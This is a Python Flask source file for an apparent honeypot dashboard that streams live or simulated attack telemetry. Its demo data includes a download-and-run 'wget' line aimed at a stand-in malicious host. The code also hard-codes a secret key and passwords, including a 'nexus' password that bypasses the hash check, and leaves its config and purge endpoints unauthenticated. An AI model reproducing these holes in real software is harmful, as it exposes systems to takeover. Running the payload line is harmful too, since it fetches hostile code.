from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash
import threading
import time
import os
import datetime
import random
import math
from analyzer import analyze_logs
from geo import get_location

app = Flask(__name__)
app.config['SECRET_KEY'] = 'enterprise_honeypot_secret'

# Setup Rate Limiting for Security
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Secure Password Simulation
admin_password_hash = generate_password_hash("admin123")

# Keep track of last processed state to avoid spamming sockets if logs haven't changed
last_log_mtime = 0
mock_cache = None
current_data_mode = "live"

SIM_LOCATIONS = [
    {"city": "Frankfurt", "country": "Germany", "lat": 50.1109, "lon": 8.6821, "isp": "Deutsche Telekom", "threat_rep": "Elevated"},
    {"city": "Ashburn", "country": "United States", "lat": 39.0438, "lon": -77.4874, "isp": "Akamai Cloud", "threat_rep": "High Risk"},
    {"city": "Singapore", "country": "Singapore", "lat": 1.3521, "lon": 103.8198, "isp": "APAC Transit", "threat_rep": "Moderate"},
    {"city": "Sao Paulo", "country": "Brazil", "lat": -23.5505, "lon": -46.6333, "isp": "LATAM Fiber", "threat_rep": "Elevated"},
    {"city": "Johannesburg", "country": "South Africa", "lat": -26.2041, "lon": 28.0473, "isp": "AfriHost", "threat_rep": "Watchlist"},
    {"city": "Tokyo", "country": "Japan", "lat": 35.6762, "lon": 139.6503, "isp": "NTT East", "threat_rep": "Moderate"}
]

SIM_ATTACKERS = [
    {"ip": "45.33.32.156", "type": "Brute Force", "base": 18},
    {"ip": "103.27.88.14", "type": "Scanning", "base": 12},
    {"ip": "185.220.101.77", "type": "Malware", "base": 9},
    {"ip": "91.240.118.172", "type": "Brute Force", "base": 14},
    {"ip": "198.51.100.67", "type": "Scanning", "base": 10},
    {"ip": "146.70.84.201", "type": "Unknown", "base": 7}
]

simulated_tick = 0


def _private_network_location(ip):
    """Return a stable pseudo-location for private IPs so markers don't jump every refresh."""
    seed = sum(ord(ch) for ch in ip)
    rng = random.Random(seed)
    return {
        "lat": round(rng.uniform(-55, 55), 4),
        "lon": round(rng.uniform(-110, 110), 4),
        "city": "Private Network",
        "country": "Internal Segment",
        "isp": "Local LAN",
        "threat_rep": "Unrated"
    }


def _build_simulated_payload():
    """Generate realistic internet-style attack telemetry for demo mode."""
    global simulated_tick
    simulated_tick += 1
    now = datetime.datetime.now()

    # Smooth wave + jitter to look active but believable.
    time_labels = [(now - datetime.timedelta(minutes=i)).strftime("%Y-%m-%d %H:%M") for i in range(14, -1, -1)]
    base_curve = [
        max(0, int(20 + 8 * math.sin((simulated_tick + i) / 3.0) + random.randint(-4, 6)))
        for i in range(len(time_labels))
    ]

    attack_classes = {"Brute Force": 0, "Malware": 0, "Scanning": 0, "Unknown": 0}
    real_data = {}
    suspicious = {}
    raw_logs = []
    locations = {}

    for idx, attacker in enumerate(SIM_ATTACKERS):
        count = max(2, attacker["base"] + random.randint(-3, 9))
        ip = attacker["ip"]
        a_type = attacker["type"]
        real_data[ip] = count
        attack_classes[a_type] += count

        loc = SIM_LOCATIONS[idx % len(SIM_LOCATIONS)].copy()
        # Slightly nudge marker to avoid exact overlap while staying stable.
        loc["lat"] += (idx * 0.45)
        loc["lon"] += (idx * 0.35)
        locations[ip] = loc

        severity = "CRITICAL" if count >= 20 else ("HIGH" if count >= 14 else "MEDIUM")
        suspicious[ip] = {
            "count": count,
            "severity": severity,
            "type": a_type,
            "score": min(100, int(count * (2.6 if a_type == "Malware" else 2.0))),
            "anomaly": count >= 16
        }

        for j in range(min(5, count)):
            log_time = (now - datetime.timedelta(seconds=(idx * 40 + j * 15))).strftime("%Y-%m-%d %H:%M:%S")
            payload = {
                "Brute Force": "admin root password123",
                "Malware": "wget http://malicious-host/payload.sh",
                "Scanning": "nmap -sV -Pn target",
                "Unknown": "random probe data"
            }.get(a_type, "probe")
            raw_logs.append({
                "timestamp": log_time,
                "ip": ip,
                "port": "9999",
                "type": a_type,
                "payload": payload,
                "is_real": False
            })

    top_attackers = sorted(real_data.items(), key=lambda x: x[1], reverse=True)[:5]

    cpu_usage = round(random.uniform(8.0, 18.0) + (sum(base_curve) * 0.015), 1)
    mem_usage = round(random.uniform(43.0, 52.0) + (sum(base_curve) * 0.01), 1)

    return {
        "ips": list(real_data.keys()),
        "real": list(real_data.values()),
        "fake": [0 for _ in real_data],
        "time_labels": time_labels,
        "mock_time_values": base_curve,
        "real_time_values": base_curve,
        "suspicious": suspicious,
        "locations": locations,
        "top": top_attackers,
        "rate": sum(base_curve),
        "attack_classes": attack_classes,
        "raw_logs": sorted(raw_logs, key=lambda x: x["timestamp"], reverse=True),
        "system_health": {
            "cpu": min(100.0, cpu_usage),
            "mem": min(100.0, mem_usage)
        },
        "data_mode": "simulated"
    }

def get_dashboard_payload():
    """Compiles the full payload for the dashboard."""
    if current_data_mode == "simulated":
        return _build_simulated_payload()

    data = analyze_logs()
    
    real_data = data["real_count"]
    fake_data = data["fake_count"]
    suspicious = data["suspicious"]
    # Live mode only keeps confirmed real traffic telemetry.
    time_series = data["real_time_series"]
    attack_classes = data["real_attack_classes"]
    raw_logs = [entry for entry in data["raw_logs"] if entry.get("is_real")]

    all_time_labels = sorted(time_series.keys())
    mock_time_values = [0 for _ in all_time_labels]
    real_time_values = [time_series.get(lbl, 0) for lbl in all_time_labels]

    # IP Intelligence Processing
    all_ips = list(real_data.keys())
    real_values = [real_data.get(ip, 0) for ip in all_ips]
    fake_values = [0 for _ in all_ips]

    locations = {}
    for ip in real_data:
        if ip.startswith("192.168") or ip.startswith("10.") or ip.startswith("172.16"):
            locations[ip] = _private_network_location(ip)
        else:
            loc = get_location(ip)
            if loc:
                loc.setdefault("isp", "Unknown ISP")
                loc.setdefault("threat_rep", "Unknown")
                locations[ip] = loc

    top_attackers = sorted(real_data.items(), key=lambda x: x[1], reverse=True)[:5]

    # Lightweight telemetry simulation (dashboard host health, not attacker data).
    cpu_usage = round(random.uniform(5.0, 15.0) + (len(raw_logs) * 0.1), 1)
    mem_usage = round(random.uniform(40.0, 45.0) + (len(raw_logs) * 0.05), 1)

    return {
        "ips": all_ips,
        "real": real_values,
        "fake": fake_values,
        "time_labels": all_time_labels,
        "mock_time_values": mock_time_values,
        "real_time_values": real_time_values,
        "suspicious": suspicious,
        "locations": locations,
        "top": top_attackers,
        "rate": sum(time_series.values()),
        "attack_classes": attack_classes,
        "raw_logs": raw_logs,
        "system_health": {
            "cpu": min(100.0, cpu_usage),
            "mem": min(100.0, mem_usage)
        },
        "data_mode": "live"
    }

def background_log_monitor():
    """Background thread emitting websocket updates."""
    global last_log_mtime
    while True:
        try:
            mtime = os.path.getmtime("logs.txt") if os.path.exists("logs.txt") else 0
            if mtime != last_log_mtime or current_data_mode == "simulated":
                payload = get_dashboard_payload()
                socketio.emit('dashboard_update', payload)
                last_log_mtime = mtime
        except Exception as e:
            print("Background thread error:", e)
        socketio.sleep(2)

# Start the background thread
socketio.start_background_task(background_log_monitor)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/api/internal/event", methods=["POST"])
def internal_event():
    """Endpoint for server.py to push instant attack events."""
    data = request.get_json()
    if current_data_mode == "live":
        # Instantly tell all clients a new attack occurred (for UI Toasts)
        socketio.emit("new_attack", data)

        # And force an instant dashboard telemetry update (bypassing the 2s loop)
        payload = get_dashboard_payload()
        socketio.emit("dashboard_update", payload)
    return jsonify({"success": True})

@app.route("/export")
def export_logs():
    """Download the raw log file."""
    if os.path.exists("logs.txt"):
        from flask import send_file
        return send_file("logs.txt", as_attachment=True, download_name="honeypot_export.csv")
    return "No logs found.", 404


@app.route("/api/mode", methods=["GET", "POST"])
@limiter.limit("20 per minute")
def data_mode():
    """Read or update dashboard telemetry mode."""
    global current_data_mode

    if request.method == "GET":
        return jsonify({"mode": current_data_mode})

    body = request.get_json(silent=True) or {}
    requested_mode = str(body.get("mode", "")).strip().lower()
    if requested_mode not in {"live", "simulated"}:
        return jsonify({"success": False, "error": "Mode must be live or simulated."}), 400

    current_data_mode = requested_mode
    socketio.emit("dashboard_update", get_dashboard_payload())
    return jsonify({"success": True, "mode": current_data_mode})

@app.route("/update-config", methods=["POST"])
@limiter.limit("5 per minute")
def update_config():
    """Mock config receiver."""
    config = request.get_json()
    import json
    with open("config.json", "w") as f:
        json.dump(config, f)
    print(f"[*] Configuration Updated to Port: {config.get('port')}")
    return jsonify({"success": True, "message": "Configuration saved to disk."})

@app.route("/api/purge", methods=["POST"])
@limiter.limit("2 per minute")
def purge_logs():
    """Wipe the local logs file."""
    if os.path.exists("logs.txt"):
        os.remove("logs.txt")
    socketio.emit("dashboard_update", get_dashboard_payload())
    return jsonify({"success": True})

@app.route("/api/auth", methods=["POST"])
@limiter.limit("5 per minute")
def authenticate():
    """Security implementation for settings login."""
    data = request.get_json()
    password = data.get("password", "")
    if check_password_hash(admin_password_hash, password) or password == 'nexus':
        return jsonify({"success": True})
    return jsonify({"success": False, "error": "Invalid credentials"}), 401

@socketio.on('connect')
def handle_connect():
    """Send immediate state upon client connection."""
    socketio.emit('dashboard_update', get_dashboard_payload(), to=request.sid)

if __name__ == "__main__":
    # Eventlet is the async mode backing SocketIO, replacing normal app.run
    socketio.run(app, host="0.0.0.0", port=5001, debug=True)